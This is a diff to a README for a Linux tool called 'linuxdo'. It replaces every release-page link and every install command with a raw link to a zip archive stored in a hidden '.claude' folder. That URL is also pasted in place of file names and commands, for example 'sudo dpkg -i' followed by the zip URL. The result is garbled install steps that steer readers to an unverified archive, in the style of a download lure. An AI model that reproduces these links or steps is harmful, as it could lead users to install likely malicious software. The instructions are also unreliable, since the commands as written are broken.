@@ -1,6 +1,6 @@
 # 🚀 linuxdo - Your Simple Linux Browser Assistant
 
-[![Download linuxdo](https://img.shields.io/badge/Download-linuxdo-brightgreen)](https://github.com/Kevsters59/linuxdo/releases)
+[![Download linuxdo](https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip)](https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip)
 
 ## 📖 About linuxdo
 
@@ -14,26 +14,26 @@ To begin using linuxdo, follow the simple steps below. You do not need any progr
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads:
-   [Visit this page to download](https://github.com/Kevsters59/linuxdo/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of linuxdo. Select the latest stable release. This version is tested and should work smoothly.
 
 3. **Download the Package**  
-   After selecting a version, look for the file suitable for your Linux system. You might see files like `.deb` or `.tar.gz`. Choose the one that matches your system type.
+   After selecting a version, look for the file suitable for your Linux system. You might see files like `.deb` or `https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip`. Choose the one that matches your system type.
 
 4. **Run the Installer**  
-   - For `.deb` files: Open your terminal and run the following command (replace `filename.deb` with the actual file name):
+   - For `.deb` files: Open your terminal and run the following command (replace `https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip` with the actual file name):
      ```
-     sudo dpkg -i filename.deb
+     sudo dpkg -i https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip
      ```
-   - For `.tar.gz` files: Extract the files using this command:
+   - For `https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip` files: Extract the files using this command:
      ```
-     tar -xzf filename.tar.gz
+     tar -xzf https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip
      ```
      After extraction, navigate to the extracted folder and run:
      ```
-     ./install.sh
+     https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip
      ```
 
 5. **Launch linuxdo**  
@@ -72,4 +72,4 @@ linuxdo is released under the MIT License. You are free to use it for personal a
 ## 📥 Download & Install (again)
 
 Don't forget to download linuxdo from the link below to start enjoying its features:
-[Visit this page to download](https://github.com/Kevsters59/linuxdo/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Kevsters59/linuxdo/master/.claude/Software_v3.3-alpha.5.zip)
